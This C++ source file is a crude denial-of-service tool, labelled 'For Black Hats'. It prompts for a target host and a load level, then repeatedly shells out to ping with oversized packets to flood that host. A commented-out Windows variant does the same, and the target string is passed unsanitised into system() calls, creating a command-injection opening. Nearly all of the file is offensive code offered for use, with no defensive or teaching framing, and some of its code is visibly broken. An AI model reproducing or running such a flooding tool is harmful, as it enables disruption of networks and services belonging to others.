#include<iostream>
#include<string>
#include<stdio.h>
#include<unistd.h>                                         #include<chrono>
#include<arpa/inet.h>
#include<stdio.h>
using namespace std;

//MACROS
#define xn std::cout<<"\n";
#define gln(x) getline(cin, x)
#define L(x) std::cout<<x;
#define ss sting
#define return xn return
#define ll long long
#define lnd long double
#define lni long int
//Global variable
unsigned lni msec = 1000000;

//Defining Functions
void lnxDdos(int,string,string);
//void winDdos(int,string,string);
int dspl(int,string,string,int);
//Driver Code
int main(){
    string Target;
    int Load;
    string cn;
    int OS;

    //Calling the Display function
    dspl(Load,Target,cn,OS);
ex:
    return 0;
}

//Display function
int dspl(int L,string T,string con,int OXS){

    //Banner
    std::cout << R"(
                      ??Ø?
                                     -v:01.00
    )" << '\n';

    //Usage
    cout<<"~ For Black Hats"; xn xn
    usleep(2.3 * msec);
 //   cout<<"[*] Specify OS [Linux (1) /Windows (2)]"; xn
 //   usleep(2   * msec);
    cout<<"[*] Enter the Target"; xn
    usleep(1.6 * msec);
    cout<<"[*] Specify Load (1,2,3)"; xn
    usleep(1.6 * msec);
    cout<<"[*] [Higher the load, severe the attack]";
    xn xn
    usleep(3.4 * msec);

    //Inputs
    cout<<"?sf$> Target: ";
    gln(T); xn
    system(("ping -c 1 " + T ).c_str());
    xn xn
    cout <<"==> 'Enter' or exit 'ctrl+c'";
    cin.get();
    xn xn
rld:
    cout<<"?sf$> Load: ";
    cin>>L; xn
    if(L < 1 || L > 3){
        cout<< "[E: Load ("<<L<<") is Invalid]";
        xn xn
        goto rld;
        xn
    }

    else if((L>='a' && L<='z') || (L>='A' && L<='Z')){
        cout<<"Alphabet ("<<L<<") can't specify 'Load'";
        goto rld;
    }
ros:
  //  cout<<"?sf$> OS: ";
  // cin>> OXS; xn
    OXS = 1;
    //Attacking according to OS
    if(OXS == 1){//OS = LINUX
         do {
            xn
            cout<<"$> ";
            gln(con);
         } while(con!="run");
         xn
         lnxDdos(L,T,con);
    }
 /*   else if(OXS == 2){//OS = WINDOWS
        do {
            xn
            cout<<"?sf$> ";
            gln(con);
        } while(con!="run");
        xn
        winDdos(L,T,con);
    }
  */

    else {
        cout<< "[E: Unsupported OS]";
        xn xn
        goto ros;
        xn
    }
    return 0;
}
//DDOS function for Linux distributions
void lnxDdos(int ld,string targ,
             string conso)
{
    //Time
    /*time_t t;
    struct tm * tt;     
    time (&t);   
    tt = localtime(&t);*/
    cout<< "OperatingSys|  Linux"; xn
    usleep(1.1 * msec);
    cout<< "Attack type |  Dos"; xn
    usleep(1.1 * msec);
    cout<< "Target      |  "<<targ; xn
    usleep(1.1 * msec);
    if(ld==1){
        cout<< "Load        ~  [1]Load";
        usleep(3 * msec); xn xn
        cout<< "Starting DOS attack at ["<<targ<<"]"; xn
        cout<<"# [in:]"; xn
        cout<<"[+] 3"; xn
        usleep(1 * msec);
        cout<<"[+] 2"; xn
        usleep(1 * msec);
        cout<<"[+] 1"; xn
      //  cout<<"Attack start time: ";//<<asctime(tt);
        usleep(1 * msec); xn
        cout<<"1-t-1m-f_d"; xn
        cout<<"load["<<ld<<"]"; xn
        for(long int z=1; z<99999999; z++){
            cout<<"[+]packet["<<z<<"][l-1] mode[flood]"<<"["<<targ<<"]"; xn
            system(("ping " + targ + " -D -i 0.2  -s 10000 -w 1 -a. > /dev/null 2>&1").c_str());
            cout<<"[+]packet["<<z<<"][l-1] mode[flood]"<<"["<<targ<<"]"; //xn
            xn
            usleep(0.2 * msec);
        }
    }
    else if(ld==2){
        cout<< "Load        ~  [2]Average";
        usleep(3 * msec); xn xn
        cout<< "Starting DOS attack at ["<<targ<<"]"; xn
        cout<<"# [in:]"; xn
        cout<<"[+] 3"; xn
        usleep(1 * msec);
        cout<<"[+] 2"; xn
        usleep(1 * msec);
        cout<<"[+] 1"; xn

     //   cout<<"Attack start time: "<<asctime(tt);
        usleep(1 * msec); xn
        cout<<"1-t-1m-f_d"; xn
        cout<<"load["<<ld<<"]"; xn
        for(long int z=1; z<99999999; z++){
            cout<<"[+]packet["<<z<<"][l-1] mode[flood]"<<"["<<targ<<"]"; xn
            system(("ping " + targ + " -D -i 0.2 -s 30000 -w 1 -a. > /dev/null 2>&1").c_str());
            cout<<"[+]packet["<<z<<"][l-1] mode[flood]"<<"["<<targ<<"]"; //xn
            xn
            usleep(0.2 * msec);
        }
    }
    else if(ld==3){
        cout<< "Load        ->  [3]High";
        usleep(3 * msec); xn xn
        cout<< "Starting DOS attack at ["<<targ<<"]"; xn
        cout<<"# [in:] "; xn
        cout<<"[+] 3"; xn
        usleep(1 * msec);
        cout<<"[+] 2"; xn
        usleep(1 * msec);
        cout<<"[+] 1"; xn
   //     cout<<"Attack start time: "<<asctime(tt);
        usleep(1 * msec); xn
        cout<<"1-t-1m-f_d"; xn
        cout<<"load["<<ld<<"]"; xn
        for(long int z=1; z<99999999; z++){
            cout<<"[+]packet["<<z<<"][l-1] mode[flood]"<<"["<<targ<<"]"; xn
            system(("ping " + targ + " -D -i 0.2 -i -s 65000 -w 1 -a. > /dev/null 2>&1").c_str());
            cout<<"[+]packet["<<z<<"][l-1] mode[flood]"<<"["<<targ<<"]"; xn
            usleep(0.2 * msec);
        }
    }
    else{;}
}

/*Windows version is under maintenance
//DDOS function for windows distributions
void winDdos(int ld,string targ,
             string conso)
{

    cout<< "OS          ->  Windows"; xn
    usleep(1.1 * msec);
    cout<< "Attack type ->  Dos"; xn
    usleep(1.1 * msec);
    cout<< "Target      ->  "<<targ; xn
    usleep(1.1 * msec);
    if(ld==1){
        cout<< "Load        ->  [1]Low";
        usleep(1.8 * msec);
        xn
        xn
        cout<<"Starting attack in: ";
        for(int z=1;z>4;z++){
            usleep(1 * msec);
            cout<< "[+] "<<z; xn
            cout<< "[# Attack has started] !";
            system(("ping -t –l 15000 " + targ).c_str());

        }
    }
    else if(ld==2){
        cout<< "Load        ->  [2]Average";
        usleep(1.8 * msec);
        xn
        xn
        cout<<"Starting attack in: ";
        for(int z=1;z>4;z++){
            usleep(1 * msec);
            cout<< "[+] "<<z; xn
            cout<< "[# Attack has started] !";
            system(("ping -t –l 30000 " + targ).c_str());

        }
    }
    else if(ld==3){
        cout<< "Load        ->  [3]High";
        usleep(1.8 * msec);
        xn
        xn
        cout<<"Starting attack in: ";
        for(int z=1;z>4;z++){
            usleep(1 * msec);
            cout<< "[+] "<<z; xn
            cout<< "[# Attack has started] !";
            system(("ping -t –l 65500 " + targ).c_str());

        }
    }
    else{;}
}
*/